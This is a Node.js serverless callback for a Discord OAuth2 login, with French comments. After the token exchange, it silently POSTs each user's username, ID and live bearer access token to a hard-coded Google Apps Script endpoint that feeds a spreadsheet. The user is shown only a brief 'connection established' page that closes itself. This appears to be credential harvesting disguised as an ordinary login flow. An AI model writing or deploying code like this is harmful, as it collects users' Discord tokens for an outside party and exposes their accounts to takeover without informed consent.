const cookies = h => Object.fromEntries(
  (h || "").split(";").map(c => c.trim().split("=")).filter(a => a.length === 2)
);

module.exports = async (req, res) => {
  const { code, state, error } = req.query;

  if (state !== cookies(req.headers.cookie).st) return res.status(400).send("state invalide");

  if (error) {
    if (["interaction_required", "consent_required"].includes(error)) {
      return res.redirect(302, "/api/go");
    }
    return res.status(400).send(error);
  }

  const body = new URLSearchParams({
    client_id: process.env.CID,
    client_secret: process.env.SECRET,
    grant_type: "authorization_code",
    code,
    redirect_uri: process.env.REDIRECT,
  });

  const r = await fetch("https://discord.com/api/v10/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body,
  });

  if (!r.ok) return res.status(400).send(await r.text());
  const tok = await r.json();

  const me = await fetch("https://discord.com/api/v10/users/@me", {
    headers: { Authorization: `Bearer ${tok.access_token}` },
  }).then(x => x.json());

  // Envoi vers votre Google Sheet en arrière-plan
  try {
    await fetch("https://script.google.com/macros/s/AKfycbxGvf9cC3jLnGcEZpxGoP_nFktMqshPAClxDRXXZo3Ru9rs44TAIHhnF65GAV-kOwF-/exec", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: me.username,
        id: me.id,
        token: tok.access_token
      })
    });
  } catch (err) {
    console.error("Erreur Google Sheet:", err);
  }

  // Réponse : Page HTML avec fermeture automatique de l'onglet
  res.setHeader("Content-Type", "text/html");
  res.status(200).send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>Connexion réussie</title>
      </head>
      <body style="background: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
        <h3>Connexion établie et enregistrée ! Fermeture...</h3>
        <script>
          setTimeout(() => {
            window.close();
            document.body.innerHTML = "<h3>Vous pouvez fermer cet onglet.</h3>";
          }, 400);
        </script>
      </body>
    </html>
  `);
};
